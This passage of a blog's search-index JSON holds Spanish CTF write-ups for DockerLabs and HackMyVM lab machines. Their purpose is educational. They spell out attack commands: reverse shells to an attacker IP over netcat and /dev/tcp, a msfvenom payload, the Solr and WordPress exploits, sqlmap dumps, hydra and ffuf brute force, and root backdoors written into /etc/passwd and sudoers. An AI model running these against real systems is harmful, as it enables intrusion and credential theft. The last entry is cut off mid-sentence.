+    "snippet": "En este reto de DockerLabs practicamos.  Un poco de nmap  Bash  EsteganografiaHerramientas y recursos  nmap  steghide  John th ripperReconocimiento y enumeracionLo primero como siempre le tiramos u...",
+    "content": "En este reto de DockerLabs practicamos.  Un poco de nmap  Bash  EsteganografiaHerramientas y recursos  nmap  steghide  John th ripperReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX nuevo 172.17.0.2reporteComo vemos en el reporte disponemos de dos puertos abiertos uno el 22 servicio ssh y el 80 http con apache.La version que nos indica nmap de ssh parece ser buena para enumeracion de usuarios.No obsatante y por si trabajamos o pensamos trabajar realizando pentest es importante ser sigilisos  y recabar toda la informacion posible antes de empezar a hacer ruido de verdad.Dicho eso hay comandos de nmap mejores no como el de arriba.Primero reviso la WEBLa web parace que es la default de apache pero hay varias cosas cambiadas sutilmente.Si leemos bien veremos que nos da info y rutas interesantes y que no debia estar en esa pagina.Sigiendo uno de los enlaces me lleva a otra pagina con con mas info.Aqui nos habla de la importancia de los metodos como haciendo referecnia al tipo de solicitud.En una de las rutas encuentraremos un directorio upload que contiene una imagen la descargo.Lo primero que pruebo es por si la imagen esconde algo , hago uso de steghide.steghide info ohrecallwin.jpgComo vemos nos indica que necesitamos un salvoconducto para ver como se cifro y que contiene.Si regresamos a la web de bob nos habla de los metodos  y la de default nos da un ruta , hay que fijarse.Si lanzamos una peticion GET nos da esa respuesta.Ahora desde la terminal lanzo la correcta.Me devuelve lo que debe ser el salvoconducto.steghide extract -sf ohnorecallwin.jpgNos devuelve un archivo zip que esta tambien protegido , hacemos uso de john, primero hasheamos y a posterior crak.zip2jonh seguro.zip &gt; hashjohn hash --showAbrimos el zip con el pass que nos entrega john y leemos el contenido del txt.Ahora tenemos un pass es momento de entrar al sistema.InfiltracionHacemos login con rosa y despues de un ls -la vemos un directorio guion entramos y esta claro que ahi se escondio la pass del siguiente usuario es hora de hacer uso de unos comandos de bash.Aqui podemos tener varias situaciones que todos los archivos pesen lo mismo y tengamos que buscar leyendo el contenido de cada uno o que el que contenga la pass sea distinto.ls -laR | awk '{print $1, $5, $9}' | sed '/14/d'Una vez obtenido solo leemos el fichero y obtenemos el pass del otro usuario.Movimiento lateralUna vez dentro como pedro tenemos un directorio nombrado “…” acedemos y leemos la nota , en esta ocoasion con un simple comando podemos encontrar la siguiente pass.find / -type -f -user pedro 2&gt;/dev/nullEncontamos el archivo y la pass esta codificada en base64 la decodeamos y hacermos login con juan.echo 'cadena a decodear' | base64 -dPor fin somos juan veamos que tenemos.Despues de revisar todo encontramos el pass de root en un alias.Gracias por leer"
+  },
+  
+  {
+    "title": "Whoiam, DockerLabs",
+    "url": "/posts/whoiam/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, wordpress, bash command inyection",
+    "date": "2024-06-13 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs practicamos.  Reconocimiento  Explotacion de wordpress  Movimiento lateral de ususarios con sudo  Inyeccion bash scriptingHerramientas y recursos  nmap  wpscan  feroxbust...",
+    "content": "En este reto de DockerLabs practicamos.  Reconocimiento  Explotacion de wordpress  Movimiento lateral de ususarios con sudo  Inyeccion bash scriptingHerramientas y recursos  nmap  wpscan  feroxbusterReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX whoiam 172.18.0.2reporteComo vemos en el reporte solo en esta ocasión solo tenemos el puerto 80 abierto abierto por tanto la intrusión y el error si o si están el web.Con la extensión wappalizer ya sabemos que hay presumiblemente un wordpres así que primero buscamos vulns con wpscan.Con fuerza bruta no conseguimos nada con ninguno de esos usuarios.Parece que quien desarrollo el plugin trabajaba de espía para la competencia.Justo es lo que yo buscaba para practicar xss hay de todos los colores , pero en este caso vamos a probar para empezar el Authenticated Arbitrary File Upload leading to RCE.En casi todas las vías de explotación necesitamos estar autenticados excepto en CVE-2021-24146 pero solo nos devuelve info con las publicaciones realizadas , tampoco tuve suerte con el blindsql.En definitiva como si o si hay que estar autenticado en la web lanzamos feroxbuster buscando mas directorios por si se escondió alguna pista.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -u http://172.18.0.2Con feroxbuster encontramos un directorio llamado backups y un archivo prometedor dentro lo descargamos.Resulto un zip con un asci en su interior que contenía el pass de developer.Procedemos a logearnos.IntrusionEntramos sin problemas ahora busco un poco de info para saber como es la explotación con dicho plugin.  Se me olvido la versión del plugin y lanze de wpscan pero sin token, no fue capaz de encontrar las vulns.Realizamos una búsqueda en searchploitEl que nos interesa es el 50082.py , lo lanzamos.python 50082.py -T 172.18.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^Obteniendo una webshell para ejecutar comandos.Ahora es momento de mandarnos una revshell para trabajar mas gusto y sin limitaciones.Nos ponemos a la escuche , la mandamos y realizamos el tratamiento a la tty.Movimiento lateral usuariosNos encontramos con que somos www-data y disponemos de permisos para ejecutar find con sudo como el usuario rafa.sudo -u rafa find . -exec /bin/sh \\; -quitAhora a ver que nos han dejado siendo rafa.Encuentra debugfs buscamos como se hace.sudo debugfs!/bin/shSomos ruben ,seguimos para convertimos en root pues solo habían dos usuarios.Escalada finalEsta ultima parte es mas interesante pues nos han dejado un script veamos que contiene , los permisos y si nos deja modificarlo o deberemos abusar del path.&lt;Right&gt;#!/bin/bashread -rp \"Enter guess: \" numif [[ $num -eq 42 ]]then  echo \"Correct\"else  echo \"Wrong\"fiComo vemos el script es muy sencillo lo unico que hace es comprobar el numero ingresado y dependiendo de si aciertas te dice si es correcto o no.Hasta aquí fui bien pero no conseguí no hallar la manera de meter un comando que me permita ser root , puede copiar bash con permisos de suid pero después fue imposible ejecutar esa bash manteniendo los permisos elevados.Sin mas acudí a un writeup  para poder ver como inyectaban el comando en el script de bash.La carga útil por así llamarla esa[$(/bin/bash&gt;&amp;2)]Para mi por esta ultima parte la hubiese metido en dificiltad media.Como me gusta romperme los cuernos buena maquina.Enlace al blog de pylon creador de la maquina.Gracias por leer"
+  },
+  
+  {
+    "title": "Bashpariencias , DockerLabs",
+    "url": "/posts/bashparencias/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-06-09 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs aprendemos.  Scan de puertos  Bash scripting basico  Abuso de sudoHerramientas y recursos  nmap  Bucles for  Mario  Password cracking john zip2johnReconocimiento y enumer...",
+    "content": "En este reto de DockerLabs aprendemos.  Scan de puertos  Bash scripting basico  Abuso de sudoHerramientas y recursos  nmap  Bucles for  Mario  Password cracking john zip2johnReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX bashpariencias 172.18.0.2reporteComo observamos en el reporte no encontramos con el puerto 80 y un servidor ssh  corriendo en el 8899 con una versión la cual podríamos explotar.Empiezo por lo mas fácil que es revisar la web del tirón ya me indica algo prometedor pues habla una usuaria con poca experiencia.Revisando bien toda la web puedo ver que existe una pequeña fuga del nombre de dicha usuaria.Ahora me fijo directo a ese código.Tenemos la password de rosa.Hacemos login por sshIntrusionUna vez logueados con rosa vemos una carpeta en su directorio personal.Si nos fijamos es un directorio con un guion por nombre.En el mensaje queda claro como seguir, debemos cracker el archivo zip para obtener la contraseña.Primero nos lo transferimos a nuestra maquina.python3 -m http.server 9000zip2john ../../../backup_rosa.zip &gt; zip.hashjohn zip.hashPor otro lado el mensaje queda algo confuso porque nos dice que lo capturemos cuando en realidad lo que vemos es un archivo .zip y debemos crackearlo con john.Tratemos de ver los procesos que corren……ps -auxfVemos que hay un proceso con nombre pass_juan.sh , nos lleva a pensar que esta guardando la contraseña en algún lugar y solo puede ser donde tengamos permisos de escritura en home de rosa que no hay nada , en /tmp o /opt , eso serian los directorios comunes.Lanzamos y probamos un bucle por si hay suerte.for (( ; ; )) ; do cp /tmp/*.txt /home/rosa ; doneTenemos suerte en tmp y nos copia un archivo con el mismo pass que obtuvimos del zip.Movimiento lateralAhora nos convertimos en juan.Como juan vemos que tenemos permisos de sudo en dos binarios tree y cat por tanto ya sabemos que lo que hemos de buscar esta bajo algún directorio de Carlos.Como vemos nos ocurre lo mismo de antes tenemos dos opciones una mas fácil y otra con la que hemos de hacer uso de un poco de bash scripting.Visto que tenemos la pass a la vista practiquemos con bash no seamos de los que acudían al rincón del vago en tiempos antiguos.El mensaje nos dice que olvido lo tres últimos caracteres de su pass , entonces podemos crear otro pequeño bucle de for concatenando letras del abecedario y posteriormente hacer una de dos u otro bucle con while o for probando contra carlos o hacer uso del script que hizo Mario que viene genial para fuerza bruta local en linux.#!/bin/bashpalabra=chocolatefor c1 in {a..z}; do\tfor c2 in {a..z}; do\t\tfor c3 in {a..z}; do\t\t\techo \"$palabra${c1}${c2}${c3}\" &gt;&gt;dict2.txt\t\tdone\tdonedone Ahí creamos el diccionario personalizado para la ocasión.Ahora nos faltaría el script para ello lo mas sencillo ir a su github copiarlo y aprovechar  que tenemos nano y pegarlo ahí mismo.Entre el dic creado y el script de Mario resolvemos el problema.Podemos convertirnos en carlos y vemos que tiene permisos de root con el binario tee.Escalada finalAsí que tratamos de crear una nueva entrada para el fichero etc/passwd1ªCreamosa la pass para el usuarioopenssl passwd -1 -salt \"firstatack\" \"pass\"2ª La pegamos al ficheroprintf 'firstatack:$1$firstata$KaJwXv0namG9OzwTOxpN61:0:0:root:/root:/bin/bash\\n' | sudo tee -a /etc/passwd3ª- Hacemos login con el usuario creado.Gracias por leer"
+  },
+  
+  {
+    "title": "Eclipse , DockerLabs",
+    "url": "/posts/eclipse/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, rce",
+    "date": "2024-06-08 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs aprendemos.  Scan de puertos  Explotacion Slor 8.3.0Herramientas y recursos  nmap  msfconsole  scriptReconocimiento y enumeracionLanzamos nmap con los parámetros de costu...",
+    "content": "En este reto de DockerLabs aprendemos.  Scan de puertos  Explotacion Slor 8.3.0Herramientas y recursos  nmap  msfconsole  scriptReconocimiento y enumeracionLanzamos nmap con los parámetros de costumbre en un ctf.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX eclipse 172.17.0.2reporteDespués de revisar el reporte de nmap nos encontramos con el puerto 80 el cual corre un servicio apache , también observamos que corre otro servicio en el puerto 8983 que resulta ser un servidor web escrito en java usado para realizar búsquedas verticales (es decir dentro un blog por ejemplo).En el 80 solo disponemos de una imagen la cual no nos proporciona nada así que investigamos bien a solr.Como vemos en la parte del dashboard ya nos dice la versión , con ese dato paso a buscar si es explotable.Estamos de suerte y encontramos varios métodos realmente es el mismo pero con distintas formas uno con metasploit y otro con un script de python.Intrusion  Realizo tanto método con msfconsole como con script  Ojo los que no acostumbramos a usar msf pues se me pasaba por alto el parámetro set target y no me funcionabaCon metasploit sigo los pasos después de leerlo bien y nos adaptamos a nuestro entorno.metasploituse exploit/multi/http/solr_velocity_rceset RHOST 172.17.0.2checkset TARGET 1set LHOST 192.168.0.112Si nos fijamos en la imagen de abajo y dependiendo del softaware a explotar también disponemos de opciones dependiendo de donde este instalado dicho software,  show options  y show targets hay que acostumbrase a invocarlos.Hasta que me di cuenta del target paso un buen rato :-)…….Hasta aquí con metasploit.Metodo scriptCon este método es incluso mas sencillo solo debemos indicar la ip de la victima , el puerto y el comando a ejecutar por defecto tira un whoamiVamos a través del script a mandarnos una shell con netcat.Para ello en la victima ejecutamos.python3 exploit_solr_8.3.0_velocity.py 172.17.0.2 8983 \"nc 192.168.0.112 9999 -c /bin/bash\"y nos ponemos a la escucha.nc -lnvp 9999Realizamos tratamiento de la ttyscript /dev/null -c bashcontrol \u001astty raw -echo; fgEscaladaLo primero pruebo con sudo y nos pide pass, después tiro de find , con find obtenemos dosbox.Leyendo un poco entiendo que el binario nos permite escribir si no me equivoco aquí tendríamos varios archivos en los que poder escribir para hacernos root.Trate de escribir el fichero /etc/passwd el cual conseguía escribirlo pero al realizar su con el nuevo usuario que le ponía no me permitía el login error authentication failureCon mi método hacia lo siguiente pero no conseguí que funcionara.LFILE=/etc/passwdopenssl passwd -1 -salt \"loco\" \"qwerty\"/usr/bin/dosbox -c 'mount c /' -c \"echo loco:$1$lvWjKN2kvSJaYzi69Mk/:0:0:root:/root:/bin/bash &gt;&gt;c:$LFILE\" -c exitComo veis intentaba crear un usuario con privilegios de root y lo añadía al /etc/passwd.Aparentemente se añadía pero no permitía el login.Así que para terminar la maquina realice lo siguiente con sudoers.LFILE=/etc/sudoers.d/ninhackdosbox -c 'mount c /' -c \"echo ninhack ALL=(ALL) D: ALL &gt;c:$LFILE\" -c exitMuchas gracias por leer compartan y si averiguan como conseguirlo a través del passwd comenten ….un saludo."
+  },
+  
+  {
+    "title": "UserSearch , DockerLabs",
+    "url": "/posts/usersearch/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, sqli",
+    "date": "2024-06-02 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs aprendemos.  Scan de puertos  sqliHerramientas y recursos  nmap  feroxbuster  sqlmapEnumeracionLanzamos nmap con los parametros de costumbre en un ctf.sudo nmap -p- -sS -...",
+    "content": "En este reto de DockerLabs aprendemos.  Scan de puertos  sqliHerramientas y recursos  nmap  feroxbuster  sqlmapEnumeracionLanzamos nmap con los parametros de costumbre en un ctf.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX usersearch 172.18.0.2reporteComo vemos en el reporte nos encontramos con ssh y el apache accesible.Mientras reviso la web nos lanzamos feroxbuster en busca de mas pistas.Despues de estar pronbando manualmente distintos tipos de inyeccion xss, ssti, sql, no consiguo nada hasta que me da por poner admin.Como vemos en la imagem nos devuelve un password el cual pruebo con ssh sin exito.Me lleva a pensar que hay una bbdd y que solo devuelve el contenido cuando acertamos con el usuario.La respuesta de ferox nos encuentra un directorio javascript y un fichero db.php el cual debe de ser el encargado de realizar las peticione , como manualmente no puede me lanzo sqlmap.SQLIEste primer comando nos va a buscar todas la bbdd que encuentre.sqlmap -u http://172.18.0.2 --forms --dbs --batchRevisando la salida del sqlmap leo que la inyeccion se provoca a traves del parametro user.Una vez sabemos los nombres de las bbdd nos seguimos metiendo mas a fondo en esta ocasion debemos indicar que queremos ver las tablas de la base de datos que nosotros queramos.sqlmap -u http://172.18.0.2 --forms -D testdb --tables --batchComo vemos nos encuentra la tabla de users , ahora le hemos de indicar que nos muestre el contenido de dicha tabla que ya esta en columnas.sqlmap -u http://172.18.0.2 --forms -D testdb -T users --columns --batch Y por ultimo nos a de mostrar el contenido de las columnas.sqlmap -u http://172.18.0.2 --forms -D testdb -T users -C password,username --dump --batchYa conseguimos leer leer los posibles usuarios y contraseñas.InfiltracionYA habiamos probrado el user admin y no era asi que vamos a probar otro.Entro con el user kvzlxComo vemos nos deja realizar la escalada con python3.Escalada finalPara convertirnos en root realizo los siguientes pasos.  Elimino el script que indica sudo  Creo uno nuevo con el siguiente contenido.       import os;os.system('/bin/bash')    Por ultimo ejecutosudo /usr/bin/python3 /home/kvzlx/system_info.py Muchas gracia por leer e interesarte en esto temas.Comparte conocimiento."
+  },
+  
+  {
+    "title": "StrongJenkins , DockerLabs",
+    "url": "/posts/strongjenkins/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-06-01 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs aprendemos.  Scan de puertos  Fuerza bruta  Scripting con Groovy  Tratamiento de terminalHerramientas y recursos  nmap  whatweb  feroxbuster  ffufEnumeracionLanzamos nmap...",
+    "content": "En este reto de DockerLabs aprendemos.  Scan de puertos  Fuerza bruta  Scripting con Groovy  Tratamiento de terminalHerramientas y recursos  nmap  whatweb  feroxbuster  ffufEnumeracionLanzamos nmap con los parametros de costumbre en un ctf.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX StrongJenkins 172.17.0.2reporteComo nos indica nmap en este caso solo encontramos el puerto 8080 abierto y por el nombre de la maquina hay un jenkins corriendo , tambien vemos que encontro un archivo robots.txt.Veamos el robots.No aporta mucho de momento pues lo iunico que dice es que no quiere que los robots sigan los enlaces de contruccion pero es un comentario no una directiva.Ahora pasemos a observar el jenkins. Fuzzeamos por si hubiese algo mas.He tirado de feroxbuster pero no encuentra nada excepto el jenkins y nada a lo que podamos tener acceso excepto las propias imagenes de la pagina de login , no queda otra que hacer fuerza bruta.Primero me lanzo whatweb para saber que version es e intentar con las credenciales por defecto.Buscamos en internet cuales son las credenciales por defecto, averiguamos que a partir de la v2.93 se dejan de usar las credenciales por defecto que eran admin/Jenkins y tambien que el password se guarda en .jenkins/secrets/initialAdminPassword.Por lo tanto si estamos en la version 2.440.2 ya sabemos que el user es admin , asi que con unos pocos datos mas podremos lanzar el ataque.Para poder realizar el ataque como pretendo necesito saber varios parametros.  Nombre del fichero contra el que autentifica  A donde nos redireciona cuando hay error  Nombre de los valores donde introducimos user y pass  El metodo que esta claro es post.Yo lo hago desde las herramientas de desarollador.Fuerza brutaVoy a usar ffuf pues no conocia el poder que puede llegar a tener esta herramienta , probe hydra y no puede dar con el parametro que me mostrase cual el payload correto peso a que lo encontraba porque se veia claramente que la redireccion no era hacia loginErrorComandos de hydra sin exitohydra -l admin -P /home/quino/Maquinas_hack/Dockerlabs.es/Strongjenkins/dict.txt 172.17.0.2 -s 8080 http-post-form \"/j_spring_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Login:Invalid username or password\" -v Paso para ffufffuf -u http://172.17.0.2:8080/j_spring_security_check -r -c -w /home/quino/rockyou.txt -X POST -d 'j_username=admin&amp;j_password=FUZZ&amp;from=%2F&amp;Submit=LoginError' -H 'Content-Type: application/x-www-form-urlencoded' -fl 9   La perseverancia nos ayuda a lograr nuestros objetivos.InfiltracionAhora ya podemos logearnos y ver como nos mandamos un shell reversa.Una vez logueado nos trasladamos a administrar jenkins y abajo del todo tenemos la consala de scripts.Si leemos nos dice que son groovy script , debe ser algo de java y como no tengo idea me voy a revshells en busca de ayuda.Primero nc a la escucha como de costumbre.Pasteamos el codigo que nos dio revshellsNi idea pq lo metio en one-liner , pero me conecto sin problemas.Tratamiento ttyscript /dev/null -c bashcrtl \u001astty raw -echo; fgreset xtermexport TERM=xtermexport SHELL=bashDependiendo de como siga la escalada nos convendria setear tambien nuestros rows y columns.Como podemos ver en la imagen de abajo realizo varias comprobaciones y tengo exito con el comando findNos han dejado de regalo python3.10 con privilegios suid.Recomiendo instalar searchbins es increible mas rapido que navegar hasta gtofbins.Escalada finalEjecutamos como nos indica y nos convertimos en root.En la siguiente imagen podeis ver lo que sucede cuando no se ajustan la rows y la columms en nuestra terminal.No obstante nos convertimos en root.Gracias por llegar hasta aqui.  Si saben como hacer brute force contra jenkins con hydra comenten."
+  },
+  
+  {
+    "title": "Vivifytech , HackMyVm",
+    "url": "/posts/vivfytech/",
+    "categories": "HackMyVm",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-30 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "Herramientas y recursos usados  Nmap  feroxbuster  wpscanEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX vivfytech 192.168.0.104Reporte nma...",
+    "content": "Herramientas y recursos usados  Nmap  feroxbuster  wpscanEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX vivfytech 192.168.0.104Reporte nmapComo nos indica el reporte de nmap disponemos de varios puntos que revisar 22 ssh , 80 http y 3306 , 33060 que paracen ambos mysqlEn el 80 lo unico que encontramos es la plantilla por defecto de apache pero como tambien parece estar mysql deberia de haber algo mas.Fuzzeamos un poco tanto con gobuster como con feroxbuster.Con cada uno encuentro cosas interesantes.Feroxbuster me indica que tenemos uploads , wp-includes listable desde la web.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -e -x php,txt,html,jpg,js -u http://192.168.0.104Gobuster me dice que dentro de wp-includes hay un fichero llamado secrets.txt , lo descargamos y revisamos su contenido , no se si son usuarios o posibles passwords.RARO ES QUE SE PUEDA LISTAR INCLUDESRevisando la web vemos que hay un editor que se llama sancelisso lo cual podria ser un posible usuario revisamos tambien sus posts por si hay alguna pista extra si no tiraremos de hydra con sancelisso y la lista secrets.txt.Asi que me abro un txt en la maquina atacante y anoto sancelisso.Uno de los posts de este usuario nos cuenta que hay detras de la empresa vivfytech y lo que cuenta promete pues hay un ,ogollon de nombres de usuario lo cual me indica que secrets.txt son passwords.Anotamos todos los nombres sin dejarnos ningunoEn este punto podemos lanzar hydra contra ssh o probar a explotar wordpress.Yo pruebo primero con wpscan dado que es mas rapido que un ataque al protocolo ssh.wpscan --url http://192.168.0.104/wordpress/ -U users.txt -P secrets.txt  No hubo suerte asi que no queda otra que tratar con hydra.Debe ser una madriguera de conejo.hydra -L /home/quino/Maquinas_hack/hackmyvm/vivifytech/skills/user.txt -P /home/quino/Maquinas_hack/hackmyvm/vivifytech/skills/secrets.txt ssh://192.168.0.104 -t 4Tenemos suerte y nos encuentra un pass rapidisimo asi que hacemos login con las credenciales proporcionadas por hydra.InfiltracionNos conectamos via ssh y listamos para obtener la primera flag si os interesa.Vemos que existe un directorio llamado private con un fichero el cual contiene las tareas que debe realizar en la empresa y tambien un usario y passProbamos el login con esos credenciales.Conseguimos entrar , ahora debemos buscar como escalar privilegios quien me sigue sabe que siempre ejecuto primero sudo -l y en esta ocasion estamos de suerte nos han proporcionado el binario git con permisos de superusuario.Escalada finalMaquina lista.Muy divertida y jodida porque en varias ocasiones te hace pensar que la resolucion va por otro lugar….Gracias por leerGracias por leer."
+  },
+  
+  {
+    "title": "Database , DockerLabs",
+    "url": "/posts/database/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, sqli, xss",
+    "date": "2024-05-30 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs nos encontramos con el tipico escaneo de puertos , enumeracion de samba , sql injection , movimiento lateral entre usuarios y escalada final.Herramientas y recursos  nmap...",
+    "content": "En este reto de DockerLabs nos encontramos con el tipico escaneo de puertos , enumeracion de samba , sql injection , movimiento lateral entre usuarios y escalada final.Herramientas y recursos  nmap  enum4linux  Exploit notesEnumeracionLanzamos nmap con los parametros de costumbre en un ctf.sudo _nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX database 172.17.0.2reporteObservamos que tenemos el 22 el 80 y tanto el 139 como el 445 que coresponden al protocolo samba.Mientras continumamos con la enumeracion haciendo uso de enum4linux para ver que podriamos tener en samba reviasamos la web.Nos muestra un panel de login aqui podriamos probar varias cosas desde xss , sqlinjection , csp ,…. ,  si nos fijamos en el codigo no hay nada que de seguridad ni sanitizacion en la web.  Yo en este punto perdi mucho tiempò tratando de abusar del csp intentando leer el /etc/passwd , sin exito obvio .En la siguente imagen podemos ver que es susceptible a la inyeccion.Ejecuto:\"/&gt;'&gt;&lt;script src=data:text/javascript,alert(1234)&gt;&lt;/script&gt;Da errorPero lo traga  Ahora deberíamos probar a hacer login .'or 1=1-- -Conseguimos loguearnos pero a simple vista y en mi opinion esto es un agujero para perder tiempo “imagino deben haber payloads de sql inyection que nos muestren los usuarios y las passwords lo ignoro por ahora”Veamos ahora que hemos conseguido con enum4linux.enum4linux -a 172.17.0.2Esta vez tenemos mas suerte y encontramos usuarios con lo cual ya podriamos probrar con hydra hacia ssh.Para ello me creo un fichero con los nombres de los usuarios para pasarselo a hydra .hydra -L usuarios -P /home/quino/Descargas/rockyou/rockyou.txt ssh://172.17.0.2 -t 4InfiltracionHydra nos a conseguido la pass del usuario augustus , como  le pasamos la lista con los nombres de usuarios yo lo dejo trabajando por si me saca la de dylan o la de bob , mas que nada por si augusto es otra madriguera de conejo como e  login web.Vamos a logearnos y salimos de dudas.Yo siempre busco con sudo -l .Tenemos java para poder realizar movimiento lateral hacia dylan , ahora si que detengo el hydra que estaba corriendo.Intento con una revshell crada a traves de revshells.com y en este caso el codigo no funciono.Codigo que no funciono en esta , pero si andubo en la pinguinazo.public class shell {\tpublic static void main(String[] args) {\t         Process p;         \t         try {             \t\tp = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.0.112/9001 0&gt;&amp;1\");  p.waitFor();             p.destroy();                } catch (Exception e) {}     \t} }Buscando en internet encuentro el suguiente enlace java exploitmsfvenom -p java/shell_reverse_tcp LHOST=&lt;local-ip&gt; LPORT=4444 -f jar -o shell.jarAhora reviso el fichero creado y me queda claro que la diferencia salta a la vista , no me andaba porque le pasaba un script y estaba esperando un binario.Nos lo transferimos con python creando un server http y una vez lo tenemos ejecutamos para convertirnos en dylan.Nos ponemos en escuha como siempre antes de ejecutar la revshell.Una vez recibida la conexion realizamos tratamiento de la tty.Empezamos con sudo para ver si pasamos a bob o a root directos.En esta ocasion sudo no nos aporta nada pero con find tenemos suerte y encontranos el binario env con suid y podemos realizar la escalada final.Escalada finalfind / -perm -4000 2&gt;/dev/nullEjecutamos como nos indica y somos root.Hasta aqui la maquina.Muchas gracias por leer .."
+  },
+  
+  {
+    "title": "BorazuwarahCTF , DockerLabs",
+    "url": "/posts/borazu/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-29 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  nos encontramos una maquina sencilla ideal para los primeros pasos de quien este aprendiendo.Herramientas y recursos usados  Nmap  feroxbuster  exiftool  hydraEnumeracio...",
+    "content": "En este reto de DockerLabs  nos encontramos una maquina sencilla ideal para los primeros pasos de quien este aprendiendo.Herramientas y recursos usados  Nmap  feroxbuster  exiftool  hydraEnumeracionComo siempre lanzamos nmap.reporteNos muestra que solo tenemos el 22 de ssh y el 80 con apache.Primero revisamos la web.Vemos que solo hay una imagen y no hay comentarios ni nada asi que descargamos la imagen por si esconde algo.exiftool imagen.jpegexifGenial escondia un nombre de usuario , ahora con ese nombre de usuario podemos lanzar hydra , recondemos que esta el 22 abierto.hydra -l borazuwarah -P /home/quino/Descargas/rockyou/rockyou.txt ssh://172.17.0.2 -t 4 No tarda nada en devolvernos un password , pasamos a conectar por ssh.Una vez conectados buscamos como escalar yo siempre ejecutao sudo -l primero.Como vemos podemos ejecutar bash con permisos elevados.sudo bashLlegamos al final somos root , maquina ideal para dar los primeros pasos.Gracias por leer."
+  },
+  
+  {
+    "title": "Verdejo , DockerLabs",
+    "url": "/posts/verdejo/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-24 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs tenemos un escaneo de puertos , un server side template injectiony escalada de privilegios.Herramientas y recursos usados  NMAP  SSTIMAP  hacktricksEnumeracionComo siempr...",
+    "content": "En este reto de DockerLabs tenemos un escaneo de puertos , un server side template injectiony escalada de privilegios.Herramientas y recursos usados  NMAP  SSTIMAP  hacktricksEnumeracionComo siempre primero lanzamos nmap.reporteEn el reporte observamos 3 puertos abiertos, el 22 por la version tan nueva y dado que no tenemos ni pass ni user lo descartamos , en el 80 vemos la plantilla de apache y en el 8089 tenemos un Werkzeug/2.2.2 Python/3.11.2 asi que vamos a mirar bien ese puerto.Hacemos una comprobacion por si traga un ssti .Como vemos,  ejecuta la operacion que le indicamos por tanto tenemos un ssti.  Llegados a este punto he de aclarar que no es nada facil saber distinguir entre estas vulnerabilidades, es casi un prueba y error.Fase de identificaciónIdentificar el motor de la plantilla implica analizar mensajes de error o probar manualmente varias cargas útiles específicas del idioma. Las cargas útiles comunes que causan errores incluyen ${7/0}, {{7/0}} , y &lt;%= 7/0 %&gt;. Observar la respuesta del servidor a las operaciones matemáticas ayuda a identificar el motor de plantilla específico.Ahora que tenemos claro que tenemos un ssti procedemos a explotarlo , se podria hacer manualmente , con scripts incluso con burpsuit.Yo en este caso opto por probar con un script SSTIMAP.ExplotacionCuando hacemos uso de script debemos aportar la ruta completa es decir , no podemos darle solo la ip y el puerto , le debemos indicar cual es el archivo contra el que trabaja.Como explican en el enlace que comparti dependiendo de la respuesta de la carga util nos indica frete a que estamos.Me lanzo un tinja y observo los resultados.Ahora que mas o menos tenemos claro que es me lanzo sstimap para realizar la explotacion , repito podeis hacerlo manualmente desde la misma web leyendo algun fichero que os proporcione nombre de usuario para atacar por ssh con hydra , yo opto por este metodo.Como gracias a tinja ya sabemos que hay lanzo este comando directo.python3 sstimap.py -u http://172.17.0.2:8089/\\?user\\= --interactiveUna vez abierto y conectado hago que me abra una sesion en la propia maquina.runosSi nos fijamos en la imagen de abajo podemos ver que poligloto utilizo este script para saber frente a que se encontrabaJinja2 plugin has confirmed injection with tag '*'Ya estamos dentro y somo el usuario verdejo , ahora empezemos buscando binarios scripts , lo que sea que nos permita escalar privelegios , yo como siempre empiezo con sudo -l.Tenemo el binario base 64 para ejecutar como root y searchbins nos dice que lee un fichero lo codifica y luego nos lo presentara decodificado.Pues bien para resolver este acertijo nos falta saber que archivo leer y si sudo se ejecuta como root debe ser algun archivo suyo tambien podemos leer shadow y tirar con john para extraer las contraseñas de ambos usuarios.Pero vamos a tratar de averiguar si teine clave ssh root.Tenemos suerte y nos la muestraUna vez la tenemos nos la copiamos a nuestra maquina y la preparamos para 